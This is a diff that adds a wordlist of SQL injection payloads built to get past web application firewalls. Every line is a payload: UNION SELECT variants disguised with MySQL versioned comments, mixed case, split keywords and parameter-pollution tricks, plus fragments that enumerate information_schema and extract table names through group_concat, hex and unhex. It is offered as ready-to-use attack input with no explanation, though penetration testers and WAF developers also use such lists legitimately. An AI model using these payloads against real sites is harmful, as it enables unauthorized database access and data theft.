@@ -1,0 +1,70 @@
+Info
+/*!order*/+/*!by*/
+/*!50000ORDER BY*/
+/*!12345ORDER*/+/*!BY*/
+"union(select 1,2,3)-- -"
++union+distinctROW+select+
+/**//*!50000UNION SELECT*//**/
+/*!50000UniON SeLeCt*/
++#uNiOn+#sEleCt
+/*!uNiOn*/ /*!seLEct*/
++un/**/ion+se/**/lect
+/**/UNION/**//*!50000SELECT*//**/
+REVERSE(noinu)+REVERSE(tceles)
+"union (/*!/**/ SeleCT */ 1,2,3)"
+union+/*!select*/
+/**/uNIon/**/sEleCt/**/
+/**//*!union*//**//*!select*//**/
++union+distinct+select+
+uNiOn aLl sElEcT
+/**/union/*!50000select*//**/
+"UnIoN/**/SeLecT/**/1,2,3--"
+/*!50000UniON SeLeCt*/
+"group_concat(0x223e,@@version,0x3c696d67207372633d22)"
+"/?a=1+union/*&b=*/select+1,2"
++UnIoN/*&a=*/SeLeCT/*&a=*/
++uni*on+sel*ect+
+"union(select (1),(2),(3),(4),(5))"
+/**/UNION/**//*!50000SELECT*//**/
+"union(select(1),2,3)"
+uNioN (/*!/**/ SeleCT */ 11)
+union /*!50000Select*/
+/*!uNiOn*/ /*!seLEct*/
++UNunionION+SEselectLECT
+"concat(0x223e,@@version,0x3c696d67207372633d22)"
+/union\sselect/g
+/*!UnIoN*/SeLeCT
++uni>on+sel>ect+
++(UnI)(oN)+(SeL)(EcT)
++uni on+sel ect+
+/*!uNiOn*/ /*!seLEct*/
+/*!uNIOn*/ /*!SelECt*/
+/^.*union.*$/ /^.*select.*$/
+/*uni X on*/union/*sel X ect*/
+un?+un/**/ion+se/**/lect+
+"un?<ion sel="""">+un/**/ion+se/**/lect+"
+/*!union*/+/*!select*/
+"unhex(hex(Concat(Column_Name,0x3e,Table_schema,0x3e,table_Name)))"
+"un/**/ion+se/**/lect+1,2,3--"
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
+/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
+/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!table_name*/ like hex table
+"UnIoN/**/SeLecT/**/1,2,3--"
+un/**/ion+se/**/lect
+/**//*!12345cOnCat*/
+unhex(hex(concat(table_name)))
+unhex(hex(/*!50000concat*/(table_name)))
+gRoUp_cOnCAt()
+group_concat(/*!12345table_name*/)
+/*!group_concat*/(/*!12345table_name*/)
+/*!12345group_concat*/(/*!12345table_name*/)
+/*!GrOuP_ConCaT*/()
+/*!50000gRouP_cOnCaT*/()
+unhex(hex(group_concat(table_name)))
+unhex(hex(/*!12345group_concat*/(/*!table_name*/)))
+UNION/*&test=1*/SELECT/*&pwn=2*/
+unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))
+convert(group_concat(/*!table_name*/)+using+ascii)
+convert(group_concat(/*!50000table_name*/)+using+ascii)
+/**/uNIon/**/sEleCt/**/
+CONVERT(group_concat(table_name)+USING+latin4)
